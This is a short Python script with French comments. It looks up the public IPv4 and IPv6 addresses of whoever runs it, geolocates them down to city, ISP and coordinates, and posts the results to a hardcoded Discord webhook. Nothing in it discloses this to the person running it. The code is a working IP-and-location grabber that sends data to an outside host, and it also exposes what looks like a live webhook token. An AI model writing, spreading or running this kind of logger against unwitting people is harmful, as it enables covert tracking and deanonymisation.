import requests
import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1509171780353261611/USB6P41GcvaXMqvBl8ZbSjL7QWOD8u7vVzFsga3P3pLXgitjyzHG9lL81qKynpJ_py7j"

# Heure du log
now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# IPs publiques
ipv4 = requests.get("https://api.ipify.org", timeout=5).text
ipv6 = requests.get("https://api64.ipify.org", timeout=5).text

# Infos localisation
geo = requests.get("https://ipapi.co/json/", timeout=5).json()

city = geo.get("city", "Inconnue")
region = geo.get("region", "Inconnue")
country = geo.get("country_name", "Inconnu")
isp = geo.get("org", "Inconnu")
lat = geo.get("latitude", "N/A")
lon = geo.get("longitude", "N/A")

# Message structuré
message = {
    "content": f"""📡 **LOG DE CONNEXION**
🕒 Heure : {now}

🌐 IPv4 : {ipv4}
🌐 IPv6 : {ipv6}

📍 Ville : {city}
🏙 Région : {region}
🌍 Pays : {country}
📡 Fournisseur : {isp}

🧭 Coordonnées : {lat}, {lon}
"""
}

# Envoi vers Discord
response = requests.post(WEBHOOK_URL, json=message)

if response.status_code == 204:
    print("Log envoyé avec succès !")
else:
    print("Erreur :", response.status_code)

input("\nAppuie sur Entrée pour fermer...")